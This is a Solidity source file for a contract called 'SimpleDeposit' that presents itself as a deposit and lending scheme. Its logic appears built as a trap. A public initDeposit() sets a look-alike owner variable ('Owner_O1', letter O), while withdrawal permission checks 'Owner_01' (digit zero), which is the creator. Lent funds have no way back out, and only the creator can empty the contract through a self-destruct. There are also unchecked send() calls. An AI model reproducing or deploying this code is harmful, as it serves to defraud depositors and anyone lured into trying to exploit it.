1 pragma solidity ^0.4.16;
2 
3 contract Base 
4 {
5     address Creator = msg.sender;
6     address Owner_01 = msg.sender;
7 
8     
9     event Deposited(address indexed sender, uint value);
10     
11     event Invested(address indexed sender, uint value);
12     
13     event Refunded(address indexed sender, uint value);
14     
15     event Withdrew(address indexed sender, uint value);
16     
17     event Log(string message);
18     
19     address Owner_02;
20     address Owner_03;
21     
22     function add(uint256 x, uint256 y) 
23     internal 
24     returns (uint256) 
25     {
26         uint256 z = x + y;
27         if((z >= x) && (z >= y))
28         {
29           return z;
30         }
31         else
32         {
33             revert();
34         }
35     }
36 
37     function sub(uint256 x, uint256 y) 
38     internal 
39     returns (uint256) 
40     {
41         if(x >= y)
42         {
43            uint256 z = x - y;
44            return z;
45         }
46         else
47         {
48             revert();
49         }
50     }
51 
52     function mul(uint256 x, uint256 y) 
53     internal 
54     returns (uint256) 
55     {
56         uint256 z = x * y;
57         if((x == 0) || (z / x == y))
58         {
59             return z;
60         }
61         else
62         {
63             revert();
64         }
65     }
66     
67 }
68 
69 contract SimpleDeposit is Base
70 {
71     struct Creditor
72     {
73         uint Time;
74         uint Invested;
75     }
76     
77     uint public TotalDeposited;
78     uint public Available;
79     uint public DepositorsQty;
80     uint public prcntRate = 10;
81     bool RefundEnabled;
82     
83     address Owner_O1;
84     
85     mapping (address => uint) public Depositors;
86     mapping (address => Creditor) public Creditors;
87     
88     
89     address Owner_O2;
90     address Owner_O3;
91     
92 
93     function initDeposit()
94     {
95         Owner_O1 = msg.sender;
96     }
97     
98     function SetTrustee(address addr) 
99     public 
100     {
101         require((msg.sender == Owner_O2)||(msg.sender==Creator));
102         Owner_O2 = addr;
103     }
104     
105     function SetFund(address addr) 
106     public 
107     {
108         require((msg.sender == Owner_O2)||(msg.sender==Creator));
109         Owner_O3 = addr;
110     }
111     
112     function SetPrcntRate(uint val)
113     public
114     {
115         if(val>=1&&msg.sender==Creator)
116         {
117             prcntRate = val;  
118         }
119     }
120     
121     function() payable
122     {
123         Deposit();
124     }
125     
126     function Deposit() 
127     public
128     payable
129     {
130         if(msg.value>= 0.5 ether)
131         {
132             if(Depositors[msg.sender]==0)DepositorsQty++;
133             Depositors[msg.sender]+=msg.value;
134             TotalDeposited+=msg.value;
135             Available+=msg.value;
136             Invested(msg.sender,msg.value);
137         }   
138     }
139     
140     function ToLend() 
141     public 
142     payable
143     {
144         Creditors[msg.sender].Time = now;
145         Creditors[msg.sender].Invested += msg.value;
146         Deposited(msg.sender,msg.value);
147     }
148     
149     function RefundDeposit(address _addr, uint _wei) 
150     public 
151     payable
152     {
153         if(Depositors[_addr]>0)
154         {
155             if(isAllowed())
156             {
157                 _addr.send(_wei);
158                 Available-=_wei;
159                 Withdrew(_addr,_wei);
160                  
161             }
162         }
163     }
164     
165      function isAllowed()
166     private
167     constant 
168     returns (bool)
169     {
170         return( msg.sender == Owner_01 || msg.sender == Owner_02 || msg.sender == Owner_03);
171     }
172     
173     function Sunset()
174     public
175     payable
176     {
177         if(msg.sender==Creator)
178         {
179             suicide(Creator);
180         }
181     }
182     
183     
184   
185 }